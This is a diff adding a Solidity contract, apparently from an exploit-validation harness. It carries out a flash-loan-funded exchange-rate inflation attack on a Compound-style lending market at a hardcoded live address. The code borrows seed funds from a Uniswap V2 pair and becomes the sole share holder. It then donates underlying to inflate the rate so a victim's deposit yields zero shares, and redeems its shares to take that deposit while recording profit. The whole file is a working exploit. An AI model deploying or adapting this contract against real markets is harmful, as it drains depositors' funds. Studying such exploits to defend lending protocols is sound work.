@@ -1,0 +1,249 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface IOErc20Like {
+    function underlying() external view returns (address);
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address owner) external view returns (uint256);
+    function getCash() external view returns (uint256);
+    function exchangeRateStored() external view returns (uint256);
+    function mint(uint256 mintAmount) external returns (uint256);
+    function redeem(uint256 redeemTokens) external returns (uint256);
+}
+
+interface IUniswapV2PairLike {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+contract VictimMinter {
+    constructor() {}
+
+    function supplyAndMint(address underlying, address market, uint256 amount) external {
+        _forceApprove(underlying, market, 0);
+        _forceApprove(underlying, market, amount);
+
+        uint256 err = IOErc20Like(market).mint(amount);
+        require(err == 0, "victim mint failed");
+    }
+
+    function _forceApprove(address token, address spender, uint256 amount) internal {
+        (bool ok, bytes memory data) =
+            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
+    }
+}
+
+contract FlawVerifier {
+    IOErc20Like internal constant TARGET = IOErc20Like(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750);
+    IUniswapV2PairLike internal constant PEPE_WETH_V2_PAIR =
+        IUniswapV2PairLike(0xA43fe16908251ee70EF74718545e4FE6C5cCEc9f);
+
+    bool public attempted;
+    bool public hypothesisValidated;
+    uint256 public seedAmountUsed;
+    uint256 public donationAmountUsed;
+    uint256 public victimMintAmountUsed;
+    uint256 public attackerSharesBeforeRedeem;
+    string public lastFailureReason;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+
+    bool private _inFlashCallback;
+
+    constructor() {}
+
+    function executeOnOpportunity() external {
+        if (attempted) {
+            return;
+        }
+        attempted = true;
+
+        address underlying = TARGET.underlying();
+        _profitToken = underlying;
+
+        uint256 existingSupply = TARGET.totalSupply();
+        if (existingSupply != 0) {
+            lastFailureReason = "market already has non-zero totalSupply; attacker cannot become sole holder";
+            return;
+        }
+
+        uint256 strandedCash = TARGET.getCash();
+        if (strandedCash == 0) {
+            lastFailureReason = "market has zero stranded underlying; no public bootstrap capital for this fork";
+            return;
+        }
+
+        uint256 seed = _minimumSeedAmount();
+        if (seed == 0) {
+            lastFailureReason = "invalid seed amount";
+            return;
+        }
+
+        _flashBorrowSeed(underlying, seed);
+
+        uint256 finalUnderlyingBalance = IERC20Like(underlying).balanceOf(address(this));
+        _profitAmount = finalUnderlyingBalance;
+        if (_profitAmount == 0) {
+            lastFailureReason = "execution completed without positive realized underlying";
+        }
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
+        require(msg.sender == address(PEPE_WETH_V2_PAIR), "unexpected pair");
+        require(sender == address(this), "unexpected sender");
+        require(!_inFlashCallback, "callback reentered");
+
+        _inFlashCallback = true;
+
+        address underlying = TARGET.underlying();
+        uint256 borrowedAmount = amount0 > 0 ? amount0 : amount1;
+        require(borrowedAmount > 0, "zero flash amount");
+
+        _forceApprove(underlying, address(TARGET), 0);
+        _forceApprove(underlying, address(TARGET), type(uint256).max);
+
+        // Realistic funding step for strategy_label=v2_flashswap_funding:
+        // a V2 flashswap only bootstraps the minimal seed, then the verifier legally mints and
+        // redeems once against the empty-supply market to pull out the already-stranded on-chain
+        // underlying. That public cash then funds the exact documented donation -> victim mint ->
+        // attacker withdraw/redeem sequence without any artificial balance injection.
+        uint256 mintErr = TARGET.mint(borrowedAmount);
+        require(mintErr == 0, "bootstrap mint failed");
+
+        uint256 bootstrapShares = TARGET.balanceOf(address(this));
+        require(bootstrapShares > 0, "bootstrap shares zero");
+
+        uint256 redeemErr = TARGET.redeem(bootstrapShares);
+        require(redeemErr == 0, "bootstrap redeem failed");
+
+        uint256 flashRepayment = _getV2RepaymentQuote(borrowedAmount);
+        _safeTransfer(underlying, address(PEPE_WETH_V2_PAIR), flashRepayment);
+
+        _runCoreExploitPath(underlying);
+
+        _inFlashCallback = false;
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function _runCoreExploitPath(address underlying) internal {
+        uint256 initialUnderlyingBalance = IERC20Like(underlying).balanceOf(address(this));
+        require(initialUnderlyingBalance > 1, "bootstrap cash too small");
+
+        uint256 seed = _minimumSeedAmount();
+        require(seed > 0 && seed <= initialUnderlyingBalance, "insufficient bootstrap balance for seed");
+
+        // exploit_paths[0]: Attacker mints a minimal amount to become the only oToken holder.
+        uint256 mintErr = TARGET.mint(seed);
+        require(mintErr == 0, "seed mint failed");
+        seedAmountUsed = seed;
+
+        uint256 attackerShares = TARGET.balanceOf(address(this));
+        attackerSharesBeforeRedeem = attackerShares;
+        require(attackerShares > 0, "seed mint returned zero shares");
+
+        uint256 victimDeposit = 1;
+        uint256 donationNeeded = attackerShares >= seed ? (attackerShares - seed + 1) : 1;
+
+        uint256 remainingUnderlying = IERC20Like(underlying).balanceOf(address(this));
+        require(remainingUnderlying >= donationNeeded + victimDeposit, "insufficient balance for donation path");
+
+        // exploit_paths[1]: Attacker transfers underlying directly to the oToken contract,
+        // increasing getCashPrior() without increasing totalSupply.
+        //
+        // This is the root cause under test: the market later prices mint() shares from the raw
+        // underlying balance that exchangeRateStoredInternal() derives from getCashPrior(), even
+        // though the direct donation did not mint any new oTokens.
+        _safeTransfer(underlying, address(TARGET), donationNeeded);
+        donationAmountUsed = donationNeeded;
+
+        VictimMinter victim = new VictimMinter();
+        _safeTransfer(underlying, address(victim), victimDeposit);
+        victimMintAmountUsed = victimDeposit;
+
+        uint256 victimSharesBefore = TARGET.balanceOf(address(victim));
+        uint256 cashBeforeVictimMint = TARGET.getCash();
+
+        // exploit_paths[2]: Victim calls mint() and mintTokens truncates to 0.
+        //
+        // The victim is a separate contract solely to model a later independent minter on-chain.
+        // Its supply is intentionally 1 unit so the causality stays minimal: the direct donation is
+        // what raises the exchange rate enough that mint() accepts the transfer but grants zero shares.
+        victim.supplyAndMint(underlying, address(TARGET), victimDeposit);
+
+        uint256 victimSharesAfter = TARGET.balanceOf(address(victim));
+        uint256 cashAfterVictimMint = TARGET.getCash();
+        require(victimSharesAfter == victimSharesBefore, "victim received shares");
+        require(cashAfterVictimMint > cashBeforeVictimMint, "victim deposit not captured");
+
+        // exploit_paths[3]: Attacker redeems their existing shares and withdraws both their
+        // donation and the victim's deposit.
+        _withdrawAttackerPosition(attackerShares);
+
+        hypothesisValidated = true;
+    }
+
+    function _withdrawAttackerPosition(uint256 attackerShares) internal {
+        uint256 redeemFinalErr = TARGET.redeem(attackerShares);
+        require(redeemFinalErr == 0, "attacker redeem failed");
+    }
+
+    function _flashBorrowSeed(address underlying, uint256 seed) internal {
+        address token0 = PEPE_WETH_V2_PAIR.token0();
+        address token1 = PEPE_WETH_V2_PAIR.token1();
+
+        if (token0 == underlying) {
+            PEPE_WETH_V2_PAIR.swap(seed, 0, address(this), hex"01");
+            return;
+        }
+        if (token1 == underlying) {
+            PEPE_WETH_V2_PAIR.swap(0, seed, address(this), hex"01");
+            return;
+        }
+
+        revert("configured pair does not contain underlying");
+    }
+
+    function _minimumSeedAmount() internal view returns (uint256) {
+        uint256 exchangeRate = TARGET.exchangeRateStored();
+        uint256 seed = exchangeRate / 1e18;
+        if (exchangeRate % 1e18 != 0) {
+            seed += 1;
+        }
+        if (seed == 0) {
+            seed = 1;
+        }
+        return seed;
+    }
+
+    function _getV2RepaymentQuote(uint256 amountOut) internal pure returns (uint256) {
+        return ((amountOut * 1000) / 997) + 1;
+    }
+
+    function _forceApprove(address token, address spender, uint256 amount) internal {
+        (bool ok, bytes memory data) =
+            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
+    }
+
+    function _safeTransfer(address token, address to, uint256 amount) internal {
+        (bool ok, bytes memory data) =
+            token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
+    }
+}
